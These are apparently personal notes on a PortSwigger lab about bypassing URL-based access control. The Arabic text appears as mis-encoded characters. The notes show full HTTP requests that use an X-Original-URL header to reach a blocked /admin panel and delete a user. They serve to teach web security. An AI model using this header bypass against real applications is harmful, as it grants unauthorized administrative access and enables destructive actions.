## ğŸ¯  [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

### ğŸ“ Ø§Ù„ÙˆØµÙ
ÙŠÙˆØ¬Ø¯ Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ù…Ø¯ÙŠØ± Ø¹Ù„Ù‰ Ù…Ø³Ø§Ø± `/admin` ÙˆÙ„ÙƒÙ† ØªÙ… Ø­Ø¸Ø± Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„ÙŠÙ‡ Ù…Ù† Ø®Ù„Ø§Ù„ Ù†Ø¸Ø§Ù… front-end. Ù…Ø¹ Ø°Ù„ÙƒØŒ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ ÙŠØ¯Ø¹Ù… header Ø®Ø§Øµ Ø§Ø³Ù…Ù‡ `X-Original-URL` ÙŠÙ…ÙƒÙ†Ù‡ ØªØ¬Ø§ÙˆØ² Ù‡Ø°Ø§ Ø§Ù„Ø­Ø¸Ø±.

### ğŸ¯ Ø§Ù„Ù‡Ø¯Ù
Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… ÙˆØ­Ø°Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… `carlos`

---

### ğŸ” Ø§Ù„Ø§ÙƒØªØ´Ø§Ù ÙˆØ§Ù„ØªØ­Ù„ÙŠÙ„

### âŒ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø£ÙˆÙ„ÙŠØ©:
1. Ø°Ù‡Ø¨Øª Ù…Ø¨Ø§Ø´Ø±Ø© Ø¥Ù„Ù‰ `/admin` â†’ **Ø­Ø¸Ø± 404**
2. Ø¬Ø±Ø¨Øª `/admin/` â†’ **Ù†ÙØ³ Ø§Ù„Ù†ØªÙŠØ¬Ø©**

### ğŸ’¡ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø© Ø§Ù„Ù…Ù‡Ù…Ø©:
- Ø§Ù„Ù†Ø¸Ø§Ù… ÙŠØ³ØªØ®Ø¯Ù… framework ÙŠØ¯Ø¹Ù… `X-Original-URL` header
- Ù‡Ø°Ø§ Ø§Ù„header ÙŠØ³ØªØ®Ø¯Ù… Ù„ØªØ¬Ø§ÙˆØ² Ù…Ø³Ø§Ø± Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ø£ØµÙ„ÙŠ

---

### ğŸ› ï¸ Ø®Ø·ÙˆØ§Øª Ø§Ù„Ø­Ù„ Ø§Ù„ØªÙØµÙŠÙ„ÙŠØ©
#### Step 1: Using Burp Suite
![[photo/Screenshot From 2025-10-17 12-52-42.png]]
```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin
```

<mark style="background: #BBFABBA6;">2 Ù†Ø±ÙˆØ­ Ø¹Ù„ÙŠ Repeater  Ùˆ Ù†Ø¶ÙŠÙ  x-orginal-URL: /admin </mark>
![[photo/Screenshot From 2025-10-17 13-02-42.png]]
#### Step 2: Access Admin Panel
1. Send request with <mark style="background: #FF5582A6;">X-Original-URL</mark> header:
	```http 
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin
```
	- Response shows admin panel interface
	- Contains option to delete users

#### Step 3: Delete Carlos User

![[photo/Screenshot From 2025-10-17 13-39-40.png]]
1. Send delete request using header bypass:
	```http
GET /?username=carlos HTTP/2

Host: 0ad700bf03a36103821bf166008900a3.web-security-academy.net
Cookie: session=mGA7P7tE0gJi6oLUNJDJs7VseOO5CLx5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad700bf03a36103821bf166008900a3.web-security-academy.net/

X-Original-Url: /admin/delete

Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
---

